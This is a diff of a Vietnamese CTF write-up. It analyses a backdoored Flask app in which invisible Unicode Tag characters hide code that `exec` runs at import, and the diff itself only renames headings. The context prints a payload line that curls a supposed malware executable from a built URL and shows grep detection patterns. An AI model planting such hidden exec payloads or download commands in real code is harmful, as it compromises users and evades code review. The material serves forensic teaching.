@@ -8,7 +8,7 @@
 
 Chủ repo khai báo bị hack giữa lúc phát triển một app ghi chú Flask, nghi attacker sửa code trước khi push nhưng xem diff không thấy gì. Đề cho một repo GitHub công khai, không có binary, không có dịch vụ mạng. Nhiệm vụ là chỉ ra thay đổi attacker cài vào và trích chuỗi cờ mà thay đổi đó che giấu.
 
-## Phân tích ban đầu
+## Phân tích
 
 Bản clone có 8 commit trên nhánh `main`, không có tag. `git fsck --full --dangling` không báo object không được tham chiếu; `git for-each-ref` trả ba ref cùng trỏ tới `a531ea371475532d0a6aef72a051d3bd44d1c689`. Có thể kiểm tra payload trong các commit hiện có; dữ liệu clone không đủ để kết luận remote chưa từng force-push.
 
@@ -41,7 +41,7 @@ exec(tags_list)
 
 `notes_list` không được dùng ở chỗ nào khác ngoài vòng lặp dựng `tags_list`, và `exec(tags_list)` nằm ở cấp module nên chạy ngay khi import, tức mỗi lần khởi động app. Offset `0xE0000` trùng đầu vùng Unicode Tag: U+E0020-U+E007E ánh xạ đúng sang ASCII 0x20-0x7E, U+E000A là xuống dòng. Các ký tự này không hiển thị trong editor và diff GitHub đã kiểm tra, nên dòng 6 trông như một chuỗi rỗng. Đếm được 395 ký tự U+E00xx trong `app.py`, tất cả nằm trên dòng 6 (425 ký tự, 1611 byte); 13 file còn lại của repo có 0.
 
-## Các hướng đã loại
+## Hướng đã thử
 
 `analysis/scan_hidden_unicode.py` quét working tree, mọi blob trong lịch sử, mọi commit message kèm author và committer:
 
@@ -52,7 +52,7 @@ exec(tags_list)
 5. **Mã độc ở file khác** (templates, static, tests, `db.py`, `helpers.py`): `git grep -nE "exec\(|eval\(|subprocess|os\.system|base64"` chạy trên toàn bộ revision chỉ trả về `exec(tags_list)` trong bốn phiên bản `app.py`, tức từ `bd75399` về sau.
 6. **Chạy payload để bắt request**: `example.com` là domain RFC 2606 reserved, phần đường dẫn lại là cờ XOR với `random.randbytes(32)` nên mỗi lần chạy sinh URL khác. Lời giải là phân tích tĩnh, không gọi mạng.
 
-## Chuỗi khai thác
+## Lời giải
 
 **Bước 1 - Định vị commit bị nhiễm.** Đếm ký tự Tag trong `app.py` ở từng commit:
 
@@ -127,7 +127,7 @@ flag: cdctf{G1455w0rM_w4s_pr3tTy_c0oL}
 
 Hai blob dài 32 byte, XOR ra chuỗi in được trọn vẹn, khớp `cdctf{...}` và có cấu trúc leetspeak như định dạng đề nêu. `k` tuần hoàn đúng 6 byte `67 42 06 72 17 61`, còn `f` thì không, Vai trò `f` và `k` được xác định từ phép XOR trong payload.
 
-## Flag
+## Kết quả
 
 ```bash
 python exploit.py files/app.py
@@ -151,7 +151,7 @@ subprocess.run(["curl", "-o", "./this_would_be_malware.exe", u])
 [+] da luu flag.txt
 ```
 
-## Reproduce
+## Tái hiện
 
 ```bash
 git clone https://github.com/shkorodi/notekeeper.git
